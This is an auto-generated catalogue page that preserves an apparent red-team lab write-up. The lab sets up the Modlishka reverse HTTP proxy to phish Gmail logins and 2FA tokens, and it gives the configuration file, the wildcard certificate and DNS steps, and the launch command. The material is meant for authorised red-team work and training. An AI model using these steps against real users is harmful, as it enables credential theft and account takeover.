---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Phishing with Modlishka Reverse HTTP Proxy

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-red-team-infrastructure-how-to-setup-modliska-reverse-http-proxy-for-phishing` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/red-team-infrastructure/how-to-setup-modliska-reverse-http-proxy-for-phishing.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Phishing with Modlishka Reverse HTTP Proxy](../../topics/offensive-security/phishing-with-modlishka-reverse-http-proxy.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-red-team-infrastructure-how-to-setup-modliska-reverse-http-proxy-for-phishing |
| name | Phishing with Modlishka Reverse HTTP Proxy |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/red-team-infrastructure/how-to-setup-modliska-reverse-http-proxy-for-phishing.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Annotation 2019-06-25 214151.png
- Annotation 2019-06-25 214300.png
- Annotation 2019-06-25 214425.png
- Annotation 2019-06-25 214749.png
- Annotation 2019-06-25 214849.png
- Annotation 2019-06-25 214924.png
- Annotation 2019-06-25 215107.png
- Annotation 2019-06-25 215155.png
- Annotation 2019-06-25 215308.png
- Annotation 2019-06-25 215702.png
- modlishka.gif
_body: "# Phishing with Modlishka Reverse HTTP Proxy\n\nThis lab shows how to setup a reverse HTTP proxy `Modlishka` that\
  \ can be used in phishing campaigns to steal user passwords and 2FA tokens. Modlishka makes this possible, because it sits\
  \ in the middle between the website you as an attacker are impersonating and the victim (MITM) while recording all the traffic/tokens/passwords\
  \ that traverse it.\n\n## Setup\n\nLet's start off by building a new DigitalOcean droplet, the smallest is more than enough:\n\
  \n![](<../../.gitbook/assets/Annotation 2019-06-25 214151.png>)\n\nOnce logged on, install certbot and download modlishka\
  \ binary itself:\n\n```bash\napt install certbot\nwget https://github.com/drk1wi/Modlishka/releases/download/v.1.1.0/Modlishka-linux-amd64\n\
  chmod +x Modlishka-linux-amd64 ; ls -lah\n```\n\n![](<../../.gitbook/assets/Annotation 2019-06-25 214300.png>)\n\n## Modlishka\
  \ Configuration\n\nLet's create a configuration file for modlishka:\n\n![](<../../.gitbook/assets/Annotation 2019-06-25\
  \ 214425.png>)\n\n{% code title=\"modlishka.json\" %}\n```javascript\n{\n  //domain that you will be tricking your victim\
  \ of visiting\n  \"proxyDomain\": \"redteam.me\",\n  \"listeningAddress\": \"0.0.0.0\",\n\n  //domain that you want your\
  \ victim to think they are visiting\n  \"target\": \"gmail.com\",\n  \"targetResources\": \"\",\n  \"targetRules\":    \
  \     \"PC9oZWFkPg==:\",\n  \"terminateTriggers\": \"\",\n  \"terminateRedirectUrl\": \"\",\n  \"trackingCookie\": \"id\"\
  ,\n  \"trackingParam\": \"id\",\n  \"jsRules\":\"\",\n  \"forceHTTPS\": false,\n  \"forceHTTP\": false,\n  \"dynamicMode\"\
  : false,\n  \"debug\": true,\n  \"logPostOnly\": false,\n  \"disableSecurity\": false,\n  \"log\": \"requests.log\",\n \
  \ \"plugins\": \"all\",\n  \"cert\": \"\",\n  \"certKey\": \"\",\n  \"certPool\": \"\"\n}\n```\n{% endcode %}\n\n## Wildcard\
  \ Certificates\n\nImportant - let's generate a wildcard certificate for my domain I want my phishing victims to land on\
  \ `*.redteam.me`:\n\n```csharp\ncertbot certonly --manual --preferred-challenges=dns --server https://acme-v02.api.letsencrypt.org/directory\
  \ --agree-tos -d *.redteam.me --email noreply@live.com\n```\n\nThis will generate a challenge code as shown below:\n\n![](<../../.gitbook/assets/Annotation\
  \ 2019-06-25 214749.png>)\n\nWe need to create a DNS TXT record in the DNS management console for redteam.me, which in my\
  \ case is in Digital Ocean:\n\n![](<../../.gitbook/assets/Annotation 2019-06-25 214849.png>)\n\nOnce the DNS TXT record\
  \ is created, continue with the certificate generation:\n\n![](<../../.gitbook/assets/Annotation 2019-06-25 214924.png>)\n\
  \nOnce certificates are generated, we need to convert them to a format suitable to be embedded into JSON objects:\n\n```bash\n\
  awk '{printf \"%s\\\\n\", $0}' /etc/letsencrypt/live/redteam.me/fullchain.pem\nawk '{printf \"%s\\\\n\", $0}' /etc/letsencrypt/live/redteam.me/privkey.pem\n\
  ```\n\n![](<../../.gitbook/assets/Annotation 2019-06-25 215107.png>)\n\nOnce that is done, copy over the contents of the\
  \ certs into the config - `fullchain.pem` into the `cert` and `privkey.pem` into the `certKey`:\n\n![](<../../.gitbook/assets/Annotation\
  \ 2019-06-25 215155.png>)\n\n## More DNS Records\n\nLet's create an A record for the root host `@` that simply points to\
  \ the droplet's IP:\n\n![](<../../.gitbook/assets/Annotation 2019-06-25 215308.png>)\n\nThis is very important - we need\
  \ a `CNAME` record for any host/subdomain `*` pointing to `@`\n\n![](<../../.gitbook/assets/Annotation 2019-06-25 215702.png>)\n\
  \n## Launching Modlishka\n\nWe are now ready to start the test by launching modlishka and giving it the modlishka.json config\
  \ file:\n\n```csharp\n./Modlishka-linux-amd64 -config modlishka.json\n```\n\nBelow shows how by visiting a redteam.me, I\
  \ get presented with contents of gmail.com - indicating that Modlishka and the MITM works. Again, it is important to call\
  \ it out - we did not create any copies or templates of the targeted website - the victim is actually browsing gmail, it's\
  \ just that it is being served through Modlishka where the traffic is inspected and passwords are captured:\n\n![](../../.gitbook/assets/modlishka.gif)\n\
  \n## References\n\n{% embed url=\"https://github.com/drk1wi/Modlishka\" %}"
_relative_path: offensive-security/red-team-infrastructure/how-to-setup-modliska-reverse-http-proxy-for-phishing.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/red-team-infrastructure/how-to-setup-modliska-reverse-http-proxy-for-phishing.md
````
